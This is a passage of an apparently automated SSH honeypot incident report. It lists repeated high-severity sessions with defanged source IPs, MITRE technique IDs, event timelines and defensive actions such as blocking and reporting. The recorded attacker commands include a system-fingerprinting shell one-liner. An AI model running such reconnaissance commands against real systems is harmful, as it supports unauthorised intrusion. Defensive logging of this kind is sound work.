| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:22 |
| **Last Seen** | 2026-07-06 12:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:22:57` | `cowrie.session.connect` |
| `2026-07-06 12:22:57` | `cowrie.client.version` |
| `2026-07-06 12:22:57` | `cowrie.client.kex` |
| `2026-07-06 12:22:58` | `cowrie.login.success` |
| `2026-07-06 12:23:00` | `cowrie.session.params` |
| `2026-07-06 12:23:00` | `cowrie.command.input` |
| `2026-07-06 12:23:00` | `cowrie.log.closed` |
| `2026-07-06 12:23:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26365d389c6f

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:23 |
| **Last Seen** | 2026-07-06 12:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:23:00` | `cowrie.session.connect` |
| `2026-07-06 12:23:00` | `cowrie.client.version` |
| `2026-07-06 12:23:01` | `cowrie.client.kex` |
| `2026-07-06 12:23:01` | `cowrie.login.success` |
| `2026-07-06 12:23:03` | `cowrie.session.params` |
| `2026-07-06 12:23:03` | `cowrie.command.input` |
| `2026-07-06 12:23:03` | `cowrie.log.closed` |
| `2026-07-06 12:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-645a9f085608

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:23 |
| **Last Seen** | 2026-07-06 12:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:23:03` | `cowrie.session.connect` |
| `2026-07-06 12:23:03` | `cowrie.client.version` |
| `2026-07-06 12:23:03` | `cowrie.client.kex` |
| `2026-07-06 12:23:04` | `cowrie.login.success` |
| `2026-07-06 12:23:06` | `cowrie.session.params` |
| `2026-07-06 12:23:06` | `cowrie.command.input` |
| `2026-07-06 12:23:06` | `cowrie.log.closed` |
| `2026-07-06 12:23:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29423c878846

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:23 |
| **Last Seen** | 2026-07-06 12:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:23:06` | `cowrie.session.connect` |
| `2026-07-06 12:23:06` | `cowrie.client.version` |
| `2026-07-06 12:23:06` | `cowrie.client.kex` |
| `2026-07-06 12:23:07` | `cowrie.login.success` |
| `2026-07-06 12:23:09` | `cowrie.session.params` |
| `2026-07-06 12:23:09` | `cowrie.command.input` |
| `2026-07-06 12:23:09` | `cowrie.log.closed` |
| `2026-07-06 12:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0ff1509d54a

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:23 |
| **Last Seen** | 2026-07-06 12:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:23:09` | `cowrie.session.connect` |
| `2026-07-06 12:23:09` | `cowrie.client.version` |
| `2026-07-06 12:23:10` | `cowrie.client.kex` |
| `2026-07-06 12:23:11` | `cowrie.login.success` |
| `2026-07-06 12:23:12` | `cowrie.session.params` |
| `2026-07-06 12:23:12` | `cowrie.command.input` |
| `2026-07-06 12:23:12` | `cowrie.log.closed` |
| `2026-07-06 12:23:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0ba91cc589f

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:23 |
| **Last Seen** | 2026-07-06 12:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:23:12` | `cowrie.session.connect` |
| `2026-07-06 12:23:12` | `cowrie.client.version` |
| `2026-07-06 12:23:13` | `cowrie.client.kex` |
| `2026-07-06 12:23:13` | `cowrie.login.success` |
| `2026-07-06 12:23:15` | `cowrie.session.params` |
| `2026-07-06 12:23:15` | `cowrie.command.input` |
| `2026-07-06 12:23:15` | `cowrie.log.closed` |
| `2026-07-06 12:23:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf78795de51f

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:23 |
| **Last Seen** | 2026-07-06 12:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:23:15` | `cowrie.session.connect` |
| `2026-07-06 12:23:15` | `cowrie.client.version` |
| `2026-07-06 12:23:16` | `cowrie.client.kex` |
| `2026-07-06 12:23:17` | `cowrie.login.success` |
| `2026-07-06 12:23:18` | `cowrie.session.params` |
| `2026-07-06 12:23:18` | `cowrie.command.input` |
| `2026-07-06 12:23:18` | `cowrie.log.closed` |
| `2026-07-06 12:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-182f831ec36f

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:23 |
| **Last Seen** | 2026-07-06 12:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:23:18` | `cowrie.session.connect` |
| `2026-07-06 12:23:18` | `cowrie.client.version` |
| `2026-07-06 12:23:19` | `cowrie.client.kex` |
| `2026-07-06 12:23:19` | `cowrie.login.success` |
| `2026-07-06 12:23:21` | `cowrie.session.params` |
| `2026-07-06 12:23:21` | `cowrie.command.input` |
| `2026-07-06 12:23:21` | `cowrie.log.closed` |
| `2026-07-06 12:23:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2ccb8301c1e

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:23 |
| **Last Seen** | 2026-07-06 12:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:23:21` | `cowrie.session.connect` |
| `2026-07-06 12:23:21` | `cowrie.client.version` |
| `2026-07-06 12:23:22` | `cowrie.client.kex` |
| `2026-07-06 12:23:23` | `cowrie.login.success` |
| `2026-07-06 12:23:24` | `cowrie.session.params` |
| `2026-07-06 12:23:24` | `cowrie.command.input` |
| `2026-07-06 12:23:24` | `cowrie.log.closed` |
| `2026-07-06 12:23:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c2cfc8ee649

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:23 |
| **Last Seen** | 2026-07-06 12:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:23:24` | `cowrie.session.connect` |
| `2026-07-06 12:23:24` | `cowrie.client.version` |
| `2026-07-06 12:23:25` | `cowrie.client.kex` |
| `2026-07-06 12:23:26` | `cowrie.login.success` |
| `2026-07-06 12:23:27` | `cowrie.session.params` |
| `2026-07-06 12:23:27` | `cowrie.command.input` |
| `2026-07-06 12:23:27` | `cowrie.log.closed` |
| `2026-07-06 12:23:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02a0a2b6987a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:23 |
| **Last Seen** | 2026-07-06 12:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:23:54` | `cowrie.session.connect` |
| `2026-07-06 12:23:54` | `cowrie.client.version` |
| `2026-07-06 12:23:54` | `cowrie.client.kex` |
| `2026-07-06 12:23:55` | `cowrie.login.success` |
| `2026-07-06 12:23:57` | `cowrie.session.params` |
| `2026-07-06 12:23:57` | `cowrie.command.input` |
| `2026-07-06 12:23:57` | `cowrie.command.input` |
| `2026-07-06 12:23:57` | `cowrie.command.input` |
| `2026-07-06 12:23:57` | `cowrie.command.input` |
| `2026-07-06 12:23:57` | `cowrie.command.input` |
| `2026-07-06 12:23:57` | `cowrie.command.success` |
| `2026-07-06 12:23:57` | `cowrie.command.input` |
| `2026-07-06 12:23:57` | `cowrie.command.input` |
| `2026-07-06 12:23:57` | `cowrie.command.input` |
| `2026-07-06 12:23:57` | `cowrie.command.input` |
| `2026-07-06 12:23:58` | `cowrie.log.closed` |
| `2026-07-06 12:23:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36768758683a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:24 |
| **Last Seen** | 2026-07-06 12:24 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:24:02` | `cowrie.session.connect` |
| `2026-07-06 12:24:05` | `cowrie.client.version` |
| `2026-07-06 12:24:05` | `cowrie.client.kex` |
| `2026-07-06 12:24:20` | `cowrie.login.success` |
| `2026-07-06 12:24:28` | `cowrie.session.params` |
| `2026-07-06 12:24:28` | `cowrie.command.input` |
| `2026-07-06 12:24:28` | `cowrie.command.input` |
| `2026-07-06 12:24:28` | `cowrie.command.input` |
| `2026-07-06 12:24:28` | `cowrie.command.input` |
| `2026-07-06 12:24:28` | `cowrie.command.input` |
| `2026-07-06 12:24:28` | `cowrie.command.success` |
| `2026-07-06 12:24:28` | `cowrie.command.input` |
| `2026-07-06 12:24:28` | `cowrie.command.input` |
| `2026-07-06 12:24:28` | `cowrie.command.input` |
| `2026-07-06 12:24:28` | `cowrie.command.input` |
| `2026-07-06 12:24:31` | `cowrie.log.closed` |
| `2026-07-06 12:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dc0e30bc371

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:25 |
| **Last Seen** | 2026-07-06 12:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:25:24` | `cowrie.session.connect` |
| `2026-07-06 12:25:24` | `cowrie.client.version` |
| `2026-07-06 12:25:24` | `cowrie.client.kex` |
| `2026-07-06 12:25:26` | `cowrie.login.success` |
| `2026-07-06 12:25:27` | `cowrie.session.params` |
| `2026-07-06 12:25:27` | `cowrie.command.input` |
| `2026-07-06 12:25:27` | `cowrie.command.input` |
| `2026-07-06 12:25:27` | `cowrie.command.input` |
| `2026-07-06 12:25:27` | `cowrie.command.input` |
| `2026-07-06 12:25:27` | `cowrie.command.input` |
| `2026-07-06 12:25:27` | `cowrie.command.success` |
| `2026-07-06 12:25:27` | `cowrie.command.input` |
| `2026-07-06 12:25:27` | `cowrie.command.input` |
| `2026-07-06 12:25:27` | `cowrie.command.input` |
| `2026-07-06 12:25:27` | `cowrie.command.input` |
| `2026-07-06 12:25:27` | `cowrie.log.closed` |
| `2026-07-06 12:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b2a0251d480

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:26 |
| **Last Seen** | 2026-07-06 12:26 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:26:25` | `cowrie.session.connect` |
| `2026-07-06 12:26:28` | `cowrie.client.version` |
| `2026-07-06 12:26:28` | `cowrie.client.kex` |
| `2026-07-06 12:26:43` | `cowrie.login.success` |
| `2026-07-06 12:26:50` | `cowrie.session.params` |
| `2026-07-06 12:26:50` | `cowrie.command.input` |
| `2026-07-06 12:26:50` | `cowrie.command.input` |
| `2026-07-06 12:26:50` | `cowrie.command.input` |
| `2026-07-06 12:26:50` | `cowrie.command.input` |
| `2026-07-06 12:26:50` | `cowrie.command.input` |
| `2026-07-06 12:26:50` | `cowrie.command.success` |
| `2026-07-06 12:26:50` | `cowrie.command.input` |
| `2026-07-06 12:26:50` | `cowrie.command.input` |
| `2026-07-06 12:26:50` | `cowrie.command.input` |
| `2026-07-06 12:26:50` | `cowrie.command.input` |
| `2026-07-06 12:26:54` | `cowrie.log.closed` |
| `2026-07-06 12:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54c26a11feac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:26 |
| **Last Seen** | 2026-07-06 12:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:26:54` | `cowrie.session.connect` |
| `2026-07-06 12:26:54` | `cowrie.client.version` |
| `2026-07-06 12:26:54` | `cowrie.client.kex` |
| `2026-07-06 12:26:56` | `cowrie.login.success` |
| `2026-07-06 12:26:57` | `cowrie.session.params` |
| `2026-07-06 12:26:57` | `cowrie.command.input` |
| `2026-07-06 12:26:57` | `cowrie.command.input` |
| `2026-07-06 12:26:57` | `cowrie.command.input` |
| `2026-07-06 12:26:57` | `cowrie.command.input` |
| `2026-07-06 12:26:57` | `cowrie.command.input` |
| `2026-07-06 12:26:57` | `cowrie.command.success` |
| `2026-07-06 12:26:57` | `cowrie.command.input` |
| `2026-07-06 12:26:57` | `cowrie.command.input` |
| `2026-07-06 12:26:57` | `cowrie.command.input` |
| `2026-07-06 12:26:57` | `cowrie.command.input` |
| `2026-07-06 12:26:57` | `cowrie.log.closed` |
| `2026-07-06 12:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc2282f48d2d

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 12:27 |
| **Last Seen** | 2026-07-06 12:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:27:11` | `cowrie.session.connect` |
| `2026-07-06 12:27:11` | `cowrie.client.version` |
| `2026-07-06 12:27:11` | `cowrie.client.kex` |
| `2026-07-06 12:27:11` | `cowrie.login.success` |
| `2026-07-06 12:27:12` | `cowrie.session.params` |
| `2026-07-06 12:27:12` | `cowrie.command.input` |
| `2026-07-06 12:27:12` | `cowrie.log.closed` |
| `2026-07-06 12:27:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a60cbe025ce0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:28 |
| **Last Seen** | 2026-07-06 12:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:28:26` | `cowrie.session.connect` |
| `2026-07-06 12:28:26` | `cowrie.client.version` |
| `2026-07-06 12:28:26` | `cowrie.client.kex` |
| `2026-07-06 12:28:27` | `cowrie.login.success` |
| `2026-07-06 12:28:29` | `cowrie.session.params` |
| `2026-07-06 12:28:29` | `cowrie.command.input` |
| `2026-07-06 12:28:29` | `cowrie.command.input` |
| `2026-07-06 12:28:29` | `cowrie.command.input` |
| `2026-07-06 12:28:29` | `cowrie.command.input` |
| `2026-07-06 12:28:29` | `cowrie.command.input` |
| `2026-07-06 12:28:29` | `cowrie.command.success` |
| `2026-07-06 12:28:29` | `cowrie.command.input` |
| `2026-07-06 12:28:29` | `cowrie.command.input` |
| `2026-07-06 12:28:29` | `cowrie.command.input` |
| `2026-07-06 12:28:29` | `cowrie.command.input` |
| `2026-07-06 12:28:29` | `cowrie.log.closed` |
| `2026-07-06 12:28:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89bf859ad513

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:28 |
| **Last Seen** | 2026-07-06 12:29 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:28:46` | `cowrie.session.connect` |
| `2026-07-06 12:28:49` | `cowrie.client.version` |
| `2026-07-06 12:28:49` | `cowrie.client.kex` |
| `2026-07-06 12:29:05` | `cowrie.login.success` |
| `2026-07-06 12:29:12` | `cowrie.session.params` |
| `2026-07-06 12:29:12` | `cowrie.command.input` |
| `2026-07-06 12:29:12` | `cowrie.command.input` |
| `2026-07-06 12:29:12` | `cowrie.command.input` |
| `2026-07-06 12:29:12` | `cowrie.command.input` |
| `2026-07-06 12:29:12` | `cowrie.command.input` |
| `2026-07-06 12:29:12` | `cowrie.command.success` |
| `2026-07-06 12:29:12` | `cowrie.command.input` |
| `2026-07-06 12:29:12` | `cowrie.command.input` |
| `2026-07-06 12:29:12` | `cowrie.command.input` |
| `2026-07-06 12:29:12` | `cowrie.command.input` |
| `2026-07-06 12:29:15` | `cowrie.log.closed` |
| `2026-07-06 12:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
